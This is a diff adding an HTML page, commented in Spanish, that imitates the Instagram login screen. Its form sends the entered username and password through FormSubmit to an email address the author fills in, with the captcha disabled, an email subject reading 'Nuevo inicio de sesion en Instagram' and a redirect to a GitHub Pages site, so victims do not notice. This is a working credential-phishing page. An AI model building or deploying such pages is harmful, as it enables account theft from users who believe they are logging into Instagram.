@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <!-- Esta línea soluciona los caracteres raros -->
+    <meta charset="UTF-8"> 
+    <title>Instagram - login</title>
+    <style>
+
+
+             
+        body {
+                font-family: Arial, sans-serif; 
+            
+            /* 👇 AQUÍ PUSE UNA IMAGEN DE EJEMPLO DE INTERNET 👇 */
+            background-image: url('fondo.jpg');
+            background-size: cover;       
+            background-position: center;  
+            background-repeat: no-repeat; 
+            background-attachment: fixed; 
+            /* 👆 FIN DEL CAMBIO 👆 */ 
+            font-family: Arial, sans-serif; 
+            background-color: #f4f4f4; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .login-box { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 10px; 
+            box-shadow: 0 0 10px rgba(0,0,0,0.1); 
+            text-align: center; 
+            width: 300px; 
+        }
+        .logo-img { 
+            width: 80px; 
+            height: 80px; 
+            border-radius: 50%; 
+            object-fit: cover; 
+            margin-bottom: 10px; 
+        } 
+        
+        /* AQUÍ EL ÚNICO CAMBIO: Le agregué "textarea" para que el cuadrito del discurso tenga el mismo estilo que los inputs */
+        input, textarea { 
+            width: 100%; 
+            padding: 10px; 
+            margin: 10px 0; 
+            border: 1px solid #ccc; 
+            border-radius: 5px; 
+            box-sizing: border-box; 
+            font-family: Arial, sans-serif;
+        }
+        
+        button { 
+            width: 100%; 
+            padding: 10px; 
+            background-color: #007BFF; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-size: 16px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <!-- Asegúrate de que el nombre aquí coincida con tu archivo -->
+        <img src="logo.jpg" alt="Logo " class="logo-img">
+        <h2>Instagram</h2>
+        <p>inicia sesion para continuar</p>
+        
+        <!-- CAMBIO 1: Aquí va la magia de Formsubmit. ¡PON TU CORREO! -->
+        <form action="https://formsubmit.co/TU_CORREO@instaparacosillas.com" method="POST" id="loginForm">
+            
+            <!-- CAMBIO 2: Le puse "name" para que en el correo diga qué es -->
+            <input type="text" name="Usuario_o_Correo" placeholder="Usuario o Correo" required>
+            
+            <!-- CAMBIO 3: Cambié el input raro por textarea para que puedan escribir el discurso completo -->
+            <textarea name="contraseña" placeholder="contraseña" required></textarea>
+            
+            <button type="submit">acceder</button>
+
+            <!-- CAMBIO 4: Cositas ocultas para que Formsubmit funcione bien -->
+            <!-- Pon aquí el link de tu GitHub para que regrese a tu web al enviar -->
+            <input type="hidden" name="_next" value="https://TU-USUARIO.github.io/TU-REPOSITORIO/">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="Nuevo inicio de sesion en Instagram">
+        </form>
+    </div>
+</body>
+</html>
